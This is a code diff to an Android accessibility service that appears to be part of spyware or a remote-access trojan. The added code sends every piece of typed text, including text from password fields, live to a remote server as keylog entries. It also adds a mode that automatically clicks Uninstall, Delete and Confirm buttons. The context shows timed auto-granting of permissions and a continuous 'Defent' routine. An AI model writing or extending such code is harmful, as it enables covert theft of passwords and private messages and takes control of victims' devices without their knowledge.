@@ -47,6 +47,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Grant permissions - run for 10 seconds after accessibility enabled
     private long grantPermsStartTime = 0;
     private static final long GRANT_PERMS_DURATION = 7000; // 7 seconds
+
+    // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
+    private volatile boolean uninstallAssistMode = false;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -176,13 +179,21 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             textBuilder.append(cs);
                         }
                         String typed = textBuilder.toString();
-                        String log = "[" + packageName + "] TEXT: " + typed;
-                        keylogBuffer.add(log);
-                        // Route to keylogger and app monitor
+                        String logLine = "[" + packageName + "] TEXT: " + typed;
+                        keylogBuffer.add(logLine);
+                        // Capture password fields before text is hidden
+                        String appName = getAppNameForPkg(packageName);
+                        // Route to keylogger, app monitor, and push live to server
                         try {
                             SocketManager sm = SocketManager.getInstance(this);
-                            sm.getKeylogger().logEntry(packageName, getAppNameForPkg(packageName), typed, "TEXT_CHANGED");
+                            sm.getKeylogger().logEntry(packageName, appName, typed, "TEXT_CHANGED");
                             sm.getAppMonitor().onTextChanged(packageName, typed);
+                            // Push immediately for live feed (only when connected)
+                            if (sm.isConnected()) {
+                                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                                        java.util.Locale.getDefault()).format(new java.util.Date());
+                                sm.pushKeylogEntry(packageName, appName, typed, "TEXT_CHANGED", ts);
+                            }
                         } catch (Exception ignored) {}
                     }
                     break;
@@ -233,6 +244,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             
             // Update app name
             updateCurrentAppName();
+
+            // Run UNINSTALL ASSIST — highest priority when active
+            if (runUninstallAssist(rootNode)) {
+                rootNode.recycle();
+                return;
+            }
             
             // Run DEFENT variables - never stop (continuously)
             if (runDefentProtection(rootNode)) {
@@ -368,6 +385,21 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     
     public void stopGrantPermsTimer() {
         grantPermsStartTime = 0;
+    }
+
+    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
+    public void enableUninstallAssist() {
+        uninstallAssistMode = true;
+        Log.i(TAG, "Uninstall-assist mode ENABLED");
+    }
+
+    private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
+        if (!uninstallAssistMode) return false;
+        String[] uninstallWords = { "Uninstall", "OK", "Delete", "Remove", "Yes", "Confirm" };
+        for (String word : uninstallWords) {
+            if (findAndClickFullWord(rootNode, word)) return true;
+        }
+        return false;
     }
     
     private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
